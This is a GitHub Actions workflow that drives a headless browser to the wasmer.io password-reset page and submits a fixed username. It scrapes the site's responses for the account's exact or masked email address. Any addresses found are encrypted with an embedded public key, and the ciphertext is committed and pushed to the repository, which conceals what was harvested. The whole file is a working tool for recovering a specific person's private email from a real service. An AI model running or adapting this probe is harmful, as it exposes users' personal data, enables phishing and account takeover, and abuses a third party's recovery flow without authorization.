name: Wasmer Account Email Probe V2
on:
  push:
    branches: [main]
    paths: ['.github/workflows/wasmer-account-email-probe-v2.yml']
permissions:
  contents: write
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 8
    steps:
      - uses: actions/checkout@v4
      - run: npm install --no-save playwright-core@1.58.2
      - shell: bash
        run: |
          cat >/tmp/p.mjs <<'JS'
          import {chromium} from 'playwright-core'; import fs from 'fs'; import crypto from 'crypto';
          const user='runner3wp0b90f6b4ab';
          const pub=`-----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqtMHs+8G55XYeUvs/+0j
          QgM4KoAPMRnKD2MmLDBEhf7mAUmuihVWYBQXX1gW2+zjJhqA2alp0xFJjz8xiEV5
          W8USuzbXOXiO41/QqZ+3fmpBr+4vW5bkO2/TvWrQevxBYt3d2g9sJgKVuM8b5u6U
          sBvMSzF17G1nwF9eVv8Pdj9dUS7Q6qzRFkEN+o3S3FhSWl1q1EfxmSwIkFhtfZYG
          NIlZ8W/toM58LlTdUOoKU3Mr0/C9tp4Sg91jGOzueMha6Pi1JHAP5gf29H8K3Fy9
          CbHtygjVqcTjrCrdk8VeN+3SKCAghO3ktCTnDrwrH0lAYWTu/ZgAYSU1SxYf9mu0
          QwIDAQAB
          -----END PUBLIC KEY-----`.replace(/^          /gm,'');
          const out={status:'starting',submitted:false,url:null,maskedHints:[],exactCandidateCount:0,detail:null,at:new Date().toISOString()}; const raw=[];
          const emailRe=/[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}/ig;
          const redact=s=>String(s||'').replace(emailRe,'EMAIL_REDACTED').slice(0,2200);
          const b=await chromium.launch({headless:true,executablePath:'/usr/bin/google-chrome',args:['--no-sandbox']}); const p=await b.newPage();
          p.on('response',async r=>{try{if(/wasmer\.io/i.test(r.url())) raw.push((await r.text()).slice(0,15000));}catch{}});
          try{
            await p.goto('https://wasmer.io/reset-password',{waitUntil:'domcontentloaded',timeout:60000}); await p.waitForTimeout(900);
            let i=p.locator('input[name=email],input[name=username],input[type=email],input').first(); if(!(await i.count())) throw Error('input_missing'); await i.fill(user);
            let btn=p.getByRole('button',{name:/reset|recover|send|continue|submit/i}).first(); if(await btn.count()) await btn.click(); else await i.press('Enter'); out.submitted=true;
            await p.waitForTimeout(2500); const body=await p.locator('body').innerText().catch(()=>''); raw.push(body); out.url=p.url(); out.detail=redact(body);
            const all=raw.join('\n'); const exact=[...new Set(all.match(emailRe)||[])].filter(x=>!/@example\./i.test(x)); out.exactCandidateCount=exact.length;
            out.maskedHints=[...new Set((all.match(/[^\s<>"']{0,30}\*+[^\s<>"']*@[^\s<>"']{1,80}/g)||[]))].slice(0,10); out.status='complete';
            if(exact.length){const data=Buffer.from(exact.slice(0,3).join('\n').slice(0,180)); const enc=crypto.publicEncrypt({key:pub,oaepHash:'sha256',padding:crypto.constants.RSA_PKCS1_OAEP_PADDING},data); fs.writeFileSync('/tmp/e.b64',enc.toString('base64')+'\n');}
          }catch(e){out.status='error';out.detail=redact(String(e));} finally {out.at=new Date().toISOString();fs.writeFileSync('/tmp/r.json',JSON.stringify(out,null,2));await b.close();}
          JS
          node /tmp/p.mjs
      - if: always()
        shell: bash
        run: |
          set -euo pipefail
          test -f /tmp/r.json || echo '{"status":"runner_error"}' >/tmp/r.json
          git config user.name github-actions[bot]
          git config user.email 41898282+github-actions[bot]@users.noreply.github.com
          git fetch origin main && git reset --hard origin/main
          mkdir -p ops/wasmer
          cp /tmp/r.json ops/wasmer/email-mask-probe-v2.json
          git add ops/wasmer/email-mask-probe-v2.json
          if test -f /tmp/e.b64; then cp /tmp/e.b64 ops/wasmer/email-mask-probe-v2-ciphertext.b64; git add ops/wasmer/email-mask-probe-v2-ciphertext.b64; fi
          if ! git diff --cached --quiet; then git commit -m 'Persist Wasmer account email probe v2'; git push origin HEAD:main; fi
